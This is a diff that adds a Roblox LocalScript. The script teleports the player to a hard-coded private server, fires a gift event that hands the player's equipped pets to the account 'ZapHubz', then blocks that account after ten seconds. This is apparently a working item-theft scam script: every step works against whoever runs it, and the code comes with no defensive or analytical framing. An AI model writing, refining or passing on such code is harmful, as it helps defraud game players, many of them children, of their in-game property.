@@ -1,0 +1,57 @@
+-- Place this LocalScript in StarterPlayerScripts
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+
+local PLACE_ID = game.PlaceId
+local PRIVATE_SERVER_CODE = "2da3964cd1e0984cad0b8b9d370dfa8b"
+local TARGET_USERNAME = "ZapHubz"
+local GIFT_EVENT_NAME = "GiftPetEvent"
+
+local GiftPetEvent = ReplicatedStorage:WaitForChild(GIFT_EVENT_NAME)
+
+-- Teleport to the reserved/private server
+local function teleportToPrivateServer()
+    TeleportService:TeleportToPrivateServer(PLACE_ID, PRIVATE_SERVER_CODE, {Players.LocalPlayer})
+end
+
+-- Gift equipped pets to ZapHubz
+local function giftEquippedPets()
+    GiftPetEvent:FireServer(TARGET_USERNAME)
+end
+
+-- Block ZapHubz after a delay
+local function blockZapHubzAfterDelay()
+    spawn(function()
+        wait(10)
+        local success, userId = pcall(function()
+            return Players:GetUserIdFromNameAsync(TARGET_USERNAME)
+        end)
+        if success and userId then
+            local blockSuccess, err = pcall(function()
+                Players.LocalPlayer:BlockUser(userId)
+            end)
+            if blockSuccess then
+                print("Blocked user:", TARGET_USERNAME)
+            else
+                warn("Failed to block user:", err)
+            end
+        else
+            warn("Could not get UserId for ZapHubz")
+        end
+    end)
+end
+
+-- Main logic
+teleportToPrivateServer()
+
+-- After teleport, gift pets and schedule block
+Players.LocalPlayer.OnTeleport:Connect(function(teleportState)
+    if teleportState == Enum.TeleportState.Started then
+        Players.LocalPlayer.CharacterAdded:Wait()
+        wait(2)
+        giftEquippedPets()
+        blockZapHubzAfterDelay()
+    end
+end)
